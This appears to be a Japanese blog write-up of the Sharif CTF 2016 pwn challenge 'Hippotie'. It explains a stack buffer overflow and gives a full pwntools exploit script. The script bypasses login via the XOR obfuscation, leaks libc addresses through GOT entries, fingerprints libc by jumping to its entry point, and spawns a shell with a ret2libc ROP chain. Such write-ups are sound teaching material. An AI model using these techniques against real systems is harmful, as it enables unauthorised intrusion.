---
layout: post
alias: "/blog/2016/12/19/sharif-ctf-2016-hippotie/"
date: "2016-12-19T23:44:21+09:00"
tags: [ "ctf", "writeup", "pwn", "sharif-ctf", "buffer-overflow", "libc" ]
---

# Sharif CTF 2016: Hippotie

libcのentry pointを使うと楽というの(と`s/deb8u7/deb8u6/`)はしゃろさんに教えてもらった。感謝。

## problem

``` sh
$ ./hippotie
 ▄         ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌
▐░▌       ▐░▌▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▌▀▀▀▀█░█▀▀▀▀ ▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌    ▐░▌    ▐░▌       ▐░▐░▌       ▐░▐░▌       ▐░▌    ▐░▌         ▐░▌    ▐░▌          
▐░█▄▄▄▄▄▄▄█░▌    ▐░▌    ▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄█░▐░▌       ▐░▌    ▐░▌         ▐░▌    ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌       ▐░▌    ▐░▌         ▐░▌    ▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌    ▐░▌    ▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▌    ▐░▌         ▐░▌    ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌    ▐░▌    ▐░▌         ▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌    ▐░▌          
▐░▌       ▐░▌▄▄▄▄█░█▄▄▄▄▐░▌         ▐░▌         ▐░█▄▄▄▄▄▄▄█░▌    ▐░▌     ▄▄▄▄█░█▄▄▄▄▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▐░░░░░░░░░░░▐░▌         ▐░▌         ▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▐░░░░░░░░░░░▌
 ▀         ▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀           ▀           ▀▀▀▀▀▀▀▀▀▀▀      ▀      ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                                   
1. Register
2. Sign in
3. Pack your data
4. Validate your data
5. Send your data
6. Exit

> 
```

## solution

最初にsign inが必要。
`1. Register`したusername:passwordは暗号化され、`2. Sign in`にはその暗号化後の文字列を渡さなければならない。
ただし長さ$1$の文字列ならこの暗号化の影響を受けない。

`3. Pack your data` + `4. Validate your data`でそのままstackを書き換えられる。広々とROPできる。

しかしlibcが与えられておらず、かつ手元のdatabase ([niklasb/libc-database](https://github.com/niklasb/libc-database))にない。
そこで、libcのELF headerを出力させentry pointを調べ、そこへ飛ばす。
以下のように出るので`Debian GLIBC 2.19-18+deb8u7`と分かり、これを使えば終わり。
ただし`2.19-18+deb8u7`は調べてもdownloadのlinkがない。しかし`2.19-18+deb8u6`のdownloadのurlを書き換えて叩けば降ってくる。

```
GNU C Library (Debian GLIBC 2.19-18+deb8u7) stable release version 2.19, by Roland McGrath et al.
Copyright (C) 2014 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 4.8.4.
Compiled on a Linux 3.16.36 system on 2016-11-28.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<http://www.debian.org/Bugs/>.
```

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='ctf.sharif.edu')
parser.add_argument('port', nargs='?', default=54519, type=int)
parser.add_argument('--libc', required=True)
parser.add_argument('--log-level', default='debug')
args = parser.parse_args()
context.log_level = args.log_level
p = remote(args.host, args.port)

elf = ELF('hippotie')
libc = ELF(args.libc)
main = 0x401365
main_loop = 0x40138f
alarm_offset = 0xb9cc0

pop_rdi_ret = 0x401483 # pop rdi ; ret
pop_rsi_r15_ret = 0x401481 # pop rsi ; pop r15 ; ret
pop_rsp_r13_r14_r15_ret = 0x40147d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

def obfuscate(s):
    return ''.join(map(lambda x, y: chr(ord(x) ^ ord(y)), s, s[1 :] + '\0'))

def register(name, password):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Name: ')
    p.sendline(name)
    p.recvuntil('Password: ')
    p.sendline(password)
def sign_in(name, password):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Name: ')
    p.sendline(name)
    p.recvuntil('Password: ')
    p.sendline(password)
    assert p.recvline().strip() == 'Successfully Logged In!'
def pack_your_data(data):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Which data do you want to pack? ')
    p.sendline(data)
def validate_your_data(recv=False):
    p.recvuntil('> ')
    p.sendline('4')

register('foo', 'bar')
sign_in(obfuscate('foo'), obfuscate('bar'))
payload = ''
payload += 'A' * 528
payload += 'BBBBBBB\0' # rbp
payload += p64(pop_rdi_ret)
payload += p64(elf.got['alarm'])
payload += p64(elf.plt['puts'])
payload += p64(pop_rdi_ret)
payload += p64(elf.got['setvbuf'])
payload += p64(elf.plt['puts'])
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(main)
pack_your_data(payload)
validate_your_data()
p.recvline()
alarm   = u64(p.recvline(keepends=False).ljust(8, '\0'))
setvbuf = u64(p.recvline(keepends=False).ljust(8, '\0'))
log.info('alarm: %#x', alarm)
log.info('setvbuf: %#x', setvbuf)
libc_base = setvbuf - libc.symbols['setvbuf']
# libc_base = alarm - alarm_offset
log.info('libc base: %#x', libc_base)

# # find the ELF header
# addr = alarm / 0x1000 * 0x1000
# k = 16
# while True:
#     payload = ''
#     payload += 'A' * 528
#     payload += 'BBBBBBB\0' # rbp
#     for i in range(k):
#         payload += p64(pop_rdi_ret)
#         payload += p64(addr - 0x1000 * i)
#         payload += p64(elf.plt['puts'])
#     payload += p64(main)
#     pack_your_data(payload)
#     validate_your_data()
#     p.recvline()
#     for i in range(k):
#         s = p.recvline()
#         log.info('%#x: %s', alarm - (addr - 0x1000 * i), repr(s))
#     addr -= 0x1000 * k

# # jump to libc entry point
# payload = ''
# payload += 'A' * 528
# payload += 'BBBBBBB\0' # rbp
# payload += p64(pop_rdi_ret)
# payload += p64(libc_base + 0x18) # Elf64_Ehdr.e_entry
# payload += p64(elf.plt['puts'])
# payload += p64(main)
# pack_your_data(payload)
# validate_your_data()
# p.recvline()
# entry = u64(p.recvline(keepends=False).ljust(8, '\0'))
# log.info('entry point: %#x', entry)
# payload = ''
# payload += 'A' * 528
# payload += 'BBBBBBB\0' # rbp
# payload += p64(libc_base + entry)
# pack_your_data(payload)
# validate_your_data()
# p.recvall()

register('foo', 'bar')
sign_in(obfuscate('foo'), obfuscate('bar'))
payload = ''
payload += 'A' * 528
payload += 'BBBBBBB\0' # rbp
payload += p64(pop_rdi_ret)
payload += p64(libc_base + next(libc.search('/bin/sh')))
payload += p64(libc_base + libc.symbols['system'])
pack_your_data(payload)
validate_your_data()

time.sleep(1)
p.sendline('id')
p.interactive()
```
